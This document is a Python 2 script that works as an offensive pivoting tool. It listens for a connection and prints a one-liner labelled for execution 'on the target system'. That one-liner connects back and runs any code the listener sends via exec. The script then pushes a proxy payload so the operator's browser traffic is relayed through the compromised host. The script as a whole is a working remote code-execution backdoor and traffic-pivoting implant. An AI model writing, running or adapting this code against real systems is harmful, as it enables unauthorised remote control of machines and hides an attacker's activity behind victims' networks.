#!/usr/bin/env python


import socket
PHOST = '127.0.0.1'
PPORT = 8080



def srv():
    s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while not 'LHOST' in locals() or not 'LPORT' in locals():
        try:
            LHOST,LPORT = raw_input('Enter listener (IP:Port): ').split(':')
            LPORT = int(LPORT)
        except:
            print "[*] Input must be in the form IP:PORT, (ex. 192.168.14.32:443)\n"
    s2.bind(('0.0.0.0',LPORT))
    print ("[*] Execute the following command on the target system" 
                                " to establish the connection: \n ")
    print ("python -c \"while True: import socket;s=socket.socket(socket.AF_INET,"
                       "socket.SOCK_STREAM);s.connect(('%s',%s));exec(s.recv(100000));"
                       "s.close();\"\n\n") % (LHOST,LPORT)
    s2.listen(8)
    if 1==2:
        print "1==2"
        c2, h = s2.accept()
        print "[*] Connection from %s \n" % h[0]
        c2.send("out='!';" + raw_input('>') + "s.send(out);")
        data=c2.recv(1024)
    if 1==1:
        c2, h = s2.accept()
        print "[*] Connection from %s \n" % h[0]

        c2.send(simple_client)


    s1.bind((PHOST,PPORT))
    s1.listen(8)
    print "[*] Set your browser proxy to %s:%s to proxy through the remote machine\n" % (PHOST, PPORT)
        
    while True:
        c1 = s1.accept()[0]
        data = c1.recv(1000000)
        if data:
            h = 'HTTP/1.1 200 OK\n'
            h += 'Content-Type: text/html; charset=utf-8'
            h += 'Connection: close\n\n'
            r = h + '<h1>No Response</h1>' 
            try:
                c2.send('proxy_this('+data+')')
                r = c2.recv(1000000) 
	    except Exception as e:   
                r += '\n<pre>' + str(e) + '</pre>'            
            c1.send(r)
        c1.close()
    s1.close()
                       
                       
                       

simple_client="""\r\n
s.send('ACK!')\r\n
def proxy_this(raw_request):\r\n
    print raw_request\r\n
    dx = raw_request.replace('\\n',' ').replace('\\r',' ').split(' ')\r\n
    print "dddddddxxxxxxx: %s\\n" % dx\r\n 
    try:\r\n 
        host, host_ip = dx[dx.index('Host:')+1].strip().split(':')\r\n
    except:\r\n
        try:\r\n
            host = dx[dx.index('Host:')+1].strip()\r\n
            host_ip = 80\r\n
        except:\r\n
            host=None\r\n
    if host:\r\n
        print "HOOOOOOST: %s\\n" % host\r\n
        host_ip = int(host_ip)\r\n
        ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n
        ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n
        if host_ip == 443:\r\n
            import ssl\r\n
            ss = ssl.wrap_socket(ss)\r\n
        ss.connect((host, host_ip))\r\n
        ss.send(raw_request)\r\n
        s.send(ss.recv(1000000))\r\n
        ss.close()\r\n
"""



srv()
